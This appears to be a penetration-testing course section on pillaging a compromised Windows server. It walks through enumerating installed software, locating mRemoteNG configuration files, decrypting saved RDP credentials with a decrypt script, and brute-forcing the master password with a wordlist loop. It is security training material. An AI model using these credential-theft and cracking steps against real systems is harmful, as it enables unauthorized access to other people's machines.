# Pillaging

Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.

***

## Data Sources

Below are some of the sources from which we can obtain information from compromised systems:

* Installed applications
* Installed services
  * Websites
  * File Shares
  * Databases
  * Directory Services (such as Active Directory, Azure AD, etc.)
  * Name Servers
  * Deployment Services
  * Certificate Authority
  * Source Code Management Server
  * Virtualization
  * Messaging
  * Monitoring and Logging Systems
  * Backups
* Sensitive Data
  * Keylogging
  * Screen Capture
  * Network Traffic Capture
  * Previous Audit reports
* User Information
  * History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
  * Roles and Privileges
  * Web Browsers
  * IM Clients

This is not a complete list. Anything that can provide information about our target will be valuable. Depending on the business size, purpose, and scope, we may find different information. Knowledge and familiarity with commonly used applications, server software, and middleware are essential, as most applications store their data in various formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems.

During the following sections, we will discuss and practice some aspects of Pillaging in Windows.

## Scenario

Let's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.

## Installed Applications

Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It's important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.

We will also find typical applications such as Office, remote management systems, IM clients, etc. We can use `dir` or `ls` to check the content of `Program Files` and `Program Files (x86)` to find which applications are installed. Although there may be other apps on the computer, this is a quick way to review them.

### **Identifying Common Applications**

```cmd-session
C:\>dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 900E-A7ED

 Directory of C:\Program Files

07/14/2022  08:31 PM    <DIR>          .
07/14/2022  08:31 PM    <DIR>          ..
05/16/2022  03:57 PM    <DIR>          Adobe

               0 File(s)              0 bytes
              16 Dir(s)  351,524,651,008 bytes free
```

An alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs.

### **Get Installed Programs via PowerShell & Registry Keys**

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation

```

We can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org/) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.

### **mRemoteNG**

`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

### **Discover mRemoteNG Configuration Files**

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

Let's look at the contents of the `confCons.xml` file.

### **mRemoteNG Configuration File - confCons.xml**

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

### **Decrypt the Password with mremoteng\_decrypt**

```shell-session
$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

Now let's look at an encrypted configuration file with a custom password. For this example, we set the custom password `admin`.

### **mRemoteNG Configuration File - confCons.xml**

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```

If we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we will get the following error.

### **Attempt to Decrypt the Password with a Custom Password**

```shell-session
$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="

Traceback (most recent call last):
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
    main()
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
    self.verify(received_mac_tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
    raise ValueError("MAC check failed")
ValueError: MAC check failed
```

If we use the custom password, we can decrypt it.

### **Decrypt the Password with mremoteng\_decrypt and a Custom Password**

```shell-session
$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```

In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.

### **For Loop to Crack the Master Password with mremoteng\_decrypt**

```shell-session
$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
